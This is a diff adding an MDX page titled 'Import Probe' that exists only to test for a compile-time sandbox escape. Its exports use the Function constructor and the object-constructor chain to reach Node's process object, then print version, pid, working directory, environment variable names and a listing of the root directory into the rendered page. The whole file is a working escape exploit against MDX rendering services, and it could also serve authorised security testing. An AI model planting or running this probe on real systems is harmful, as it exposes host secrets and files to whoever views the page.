@@ -1,0 +1,49 @@
+---
+title: Import Probe
+description: Test compile-time escape via constructor in exports
+---
+
+export const dynamicProbe = (() => {
+  try {
+    const F = Function;
+    return F('return typeof process')();
+  } catch(e) { return 'blocked: ' + e.message }
+})()
+
+export const constructorProbe = (() => {
+  try {
+    return ({}).constructor.constructor('return typeof process')();
+  } catch(e) { return 'blocked: ' + e.message }
+})()
+
+export const envProbe = (() => {
+  try {
+    const p = ({}).constructor.constructor('return process')();
+    return p ? JSON.stringify({
+      version: p.version,
+      arch: p.arch,
+      platform: p.platform,
+      pid: p.pid,
+      cwd: p.cwd(),
+      envKeys: Object.keys(p.env).slice(0, 20)
+    }) : 'process is falsy';
+  } catch(e) { return 'blocked: ' + e.message }
+})()
+
+export const fsProbe = (() => {
+  try {
+    const p = ({}).constructor.constructor('return process')();
+    const r = p.mainModule.require;
+    return r('fs').readdirSync('/').slice(0, 10).join(',');
+  } catch(e) { return 'blocked: ' + e.message }
+})()
+
+# Compile-Time Escape Probe
+
+**Function constructor:** {dynamicProbe}
+
+**Object constructor chain:** {constructorProbe}
+
+**process.env:** {envProbe}
+
+**fs.readdir /:** {fsProbe}
